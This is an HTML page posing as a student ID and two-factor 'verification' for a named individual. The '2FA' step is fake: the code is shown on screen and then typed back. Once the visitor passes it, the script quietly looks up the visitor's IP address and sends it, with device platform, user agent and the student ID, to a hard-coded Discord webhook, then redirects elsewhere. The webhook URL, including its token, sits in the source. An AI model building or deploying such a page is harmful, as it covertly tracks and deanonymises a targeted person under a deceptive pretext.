<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Student ID Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, blue, red);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 30px;
            border-radius: 10px;
            background-color: rgba(0, 0, 0, 0.5);
            width: 80%;
            max-width: 400px;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            padding: 10px;
            font-size: 16px;
            width: 80%;
            margin-bottom: 20px;
            border: 2px solid #fff;
            border-radius: 5px;
            background-color: rgba(255, 255, 255, 0.2);
            color: white;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: blue;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: darkblue;
        }
        #2faPrompt {
            display: none;
            margin-top: 20px;
            font-size: 18px;
            padding: 10px;
            background-color: #333;
            border-radius: 5px;
            color: #fff;
        }
    </style>
    <script>
        var studentID = "1737";  // Fixed student ID for verification
        var discordWebhookURL = "https://discord.com/api/webhooks/1318695220946272267/KqDt8OwWy9m7JaawU9oZt1F2vmPzH-g01pRmEBUPik0NuP9Se5D9L9dSqb1lUa-OdS4-";  // Your Discord webhook URL

        // Function to generate a random 6-digit 2FA code
        function generateRandom2FACode() {
            return Math.floor(100000 + Math.random() * 900000);  // Generates a 6-digit code
        }

        // Store the generated 2FA code in a variable
        var twoFACode = generateRandom2FACode();

        // Function to handle the student ID verification
        function verifyAnswer() {
            var userAnswer = document.getElementById("studentID").value;

            if (userAnswer === studentID) {
                // Show the 2FA code as a notification
                document.getElementById("2faPrompt").style.display = "block";
                document.getElementById("2faPrompt").innerHTML = "Your 2FA code is: " + twoFACode;
                document.getElementById("2faCodeInput").style.display = "block"; // Show the 2FA input field
            } else {
                alert("Incorrect student ID. Please try again.");
            }
        }

        // Function to handle 2FA code verification
        function verify2FACode() {
            var user2FACode = document.getElementById("2faCode").value;

            if (user2FACode === twoFACode.toString()) { // Compare the input code with the 2FA code
                alert("Congrats, you have been verified!");

                // Fetch user's IP address using ipify API
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        var userIP = data.ip;  // Get user's IP address
                        var deviceInfo = {
                            platform: navigator.platform, // Device platform (Windows, Mac, etc.)
                            userAgent: navigator.userAgent // Browser/device details
                        };

                        // Send the notification to Discord
                        fetch(discordWebhookURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                embeds: [{
                                    title: "User Verification",
                                    description: "User has been verified.",
                                    color: 3066993,  // Embed color
                                    fields: [
                                        {
                                            name: "Verification Status",
                                            value: "User has been verified successfully!"
                                        },
                                        {
                                            name: "Student ID",
                                            value: studentID
                                        },
                                        {
                                            name: "2FA Code",
                                            value: twoFACode
                                        },
                                        {
                                            name: "User IP Address",
                                            value: userIP
                                        },
                                        {
                                            name: "Device Info",
                                            value: `Platform: ${deviceInfo.platform}\nUser Agent: ${deviceInfo.userAgent}`
                                        }
                                    ]
                                }]
                            })
                        })
                        .then(response => {
                            if (!response.ok) {
                                console.error("Failed to send notification to Discord");
                            } else {
                                console.log("Notification sent to Discord");
                            }
                            window.location.href = "https://jamesaai.netlify.app";  // Redirect to the desired URL
                        })
                        .catch((error) => {
                            console.error("Error sending Discord notification:", error);
                            alert("There was an error sending the notification. Please try again later.");
                        });
                    })
                    .catch((error) => {
                        console.error("Error getting IP address:", error);
                        alert("Could not retrieve your IP address. Please try again.");
                    });
            } else {
                alert("Incorrect 2FA code. Please try again.");
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <h2>To verify that this is Alyssa Linn, please tell me the last 4 digits of your student ID number:</h2>
        <input type="text" id="studentID" placeholder="Enter last 4 digits" maxlength="4">
        <br>
        <button onclick="verifyAnswer()">Submit</button>

        <!-- 2FA Notification -->
        <div id="2faPrompt" style="display:none;">
            <!-- The 2FA code will be displayed here -->
        </div>

        <!-- 2FA Input Field -->
        <div id="2faCodeInput" style="display:none;">
            <h2>Please enter the 2FA code you received:</h2>
            <input type="text" id="2faCode" placeholder="Enter 2FA code" maxlength="6">
            <br>
            <button onclick="verify2FACode()">Submit 2FA Code</button>
        </div>
    </div>
</body>
</html>
